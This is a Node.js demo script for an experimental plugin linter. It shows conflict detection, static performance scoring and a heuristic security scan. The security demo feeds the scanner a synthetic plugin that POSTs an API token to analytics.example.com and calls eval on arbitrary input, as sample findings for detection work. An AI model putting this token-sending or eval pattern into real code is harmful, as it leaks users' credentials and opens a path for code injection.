#!/usr/bin/env node
/**
 * Demo of the experimental v0.3 analysis modules.
 *
 *   node examples/demo.mjs
 *
 * Everything printed here is computed from the files in this repository; there
 * are no mocked results. The analysis modules are experimental: they are
 * static heuristics, not runtime measurements or security verdicts.
 */

import { fileURLToPath } from 'node:url';
import { loadPackage, detectConflicts, analyzePerformance, analyzeSecurityDeep } from '../src/index.js';
import { maskSource } from '../src/mask.js';

const panelDir = fileURLToPath(new URL('../panel/', import.meta.url));
const line = (char = '=') => console.log(char.repeat(78));
const fakeFile = (path, text) => ({ path, text, ...maskSource(text) });

console.log('\ndsh-plugin-lint — experimental analysis demos\n');
console.log('Each module returns experimental: true together with a limits[] field.\n');

// 1. Composition conflicts --------------------------------------------------
line();
console.log('1. Composition conflicts (experimental static scan)');
line();

const client = (id) => [
  "ctx.slots.inject('settings.section', () => ctx.slots.register({",
  "  name: 'settings.section', id: '" + id + "',",
  '}, Component));',
].join('\n');

const conflicts = detectConflicts([
  { name: 'settings-plugin-a', manifest: { name: 'settings-plugin-a' }, jsFiles: [fakeFile('client.js', client('a'))] },
  { name: 'settings-plugin-b', manifest: { name: 'settings-plugin-b' }, jsFiles: [fakeFile('client.js', client('b'))] },
]);

console.log('Two synthetic plugins register the same slot:');
console.log('  conflicts:', conflicts.summary.total, '(slots: ' + conflicts.slots.length + ')');
for (const conflict of conflicts.slots) {
  console.log('  slot "' + conflict.resource + '" claimed by: ' + conflict.plugins.join(', '));
}
console.log('  authoritative runtime check: node scripts/matrix/conflicts.mjs\n');

// 2. Performance ------------------------------------------------------------
line();
console.log('2. Performance (experimental; static files only, no runtime measurement)');
line();

const panel = loadPackage(panelDir);
const perf = analyzePerformance(panel);
console.log('Panel package: ' + panel.manifest.name + '@' + panel.manifest.version);
console.log('  score: ' + perf.score + '/100 (' + perf.rating + ')');
console.log('  bundle: ' + perf.bundleSize.totalMB + ' MB across ' + perf.bundleSize.fileCount + ' files');
console.log('  code: ' + perf.complexity.totalLines + ' lines, ' + perf.complexity.totalFunctions + ' functions');
console.log('  network domains: ' + (perf.networkCalls.externalDomains.join(', ') || 'none'));
for (const rec of perf.recommendations.slice(0, 3)) console.log('  - ' + rec.issue);
console.log('  limits: ' + perf.limits[0] + '\n');

// 3. Security ---------------------------------------------------------------
line();
console.log('3. Security (experimental; patterns, not a verdict)');
line();

const risky = {
  manifest: { name: 'demo-plugin', version: '1.0.0' },
  entries: {},
  jsFiles: [fakeFile('index.js', [
    "export function save(token) {",
    "  localStorage.setItem('api_token', token);",
    "  fetch('http://analytics.example.com/track', { method: 'POST', body: JSON.stringify({ token }) });",
    '}',
    'export function run(input) { eval(input); }',
    '// Documented but not a call site: eval(input)',
  ].join('\n'))],
};
const security = analyzeSecurityDeep(risky);
console.log('  risk level: ' + security.riskLevel + ' (heuristic summary)');
console.log('  findings: ' + security.summary.total + ' (warn ' + security.summary.warn + ', info ' + security.summary.info + ')');
for (const finding of security.findings.slice(0, 6)) {
  console.log('  - [' + finding.rule + ' ' + finding.level + '] ' + finding.title + '  ' + finding.file + ':' + finding.line);
}
console.log('  limits: ' + security.limits[0] + '\n');

// 4. Upgrade planning -------------------------------------------------------
line();
console.log('4. Upgrade planning (needs local matrix data)');
line();
console.log('The upgrade planner reads matrix/cells (generated locally, not shipped in the npm package):');
console.log('  node bin/dsh-plugin-upgrade-plan.mjs --from 0.2.0-rc.2 --to 0.2.1-alpha.2 --installed ~/.dsh/profiles/desktop');
console.log('  node bin/dsh-plugin-upgrade-plan.mjs --check-compatibility panel --target 0.2.1-alpha.2 --matrix matrix/cells --json\n');

line();
console.log('These APIs are experimental. Run "npm test" for the current test status,');
console.log('and see docs/19-analysis-tools.md for usage and limitations.');
line();
console.log();
